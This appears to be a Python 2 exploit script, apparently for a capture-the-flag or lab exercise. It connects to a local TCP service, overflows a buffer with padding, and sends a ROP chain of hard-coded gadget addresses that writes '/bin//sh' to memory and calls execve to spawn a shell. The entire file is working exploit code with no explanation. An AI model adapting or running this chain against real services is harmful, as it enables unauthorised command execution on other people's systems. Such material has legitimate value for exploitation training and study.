#!/usr/bin/env python

from struct import pack
import socket
import sys
import time

from console import console


def send_cmd(cmd):

        port = int(sys.argv[1])
        sock = socket.create_connection(('127.0.0.1', port),
                                    socket.getdefaulttimeout(),
                                    ('127.0.0.1', 0))

        sock.sendall("a"*1020)
        sock.sendall(cmd+"\r\n")
    
        sock.close()
    
    
p = ''

p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x0000000b) # 11
p += pack('<I', 0x08074ded) # int 0x80

c = 'w'
i = 32
send_cmd(c*i+p)

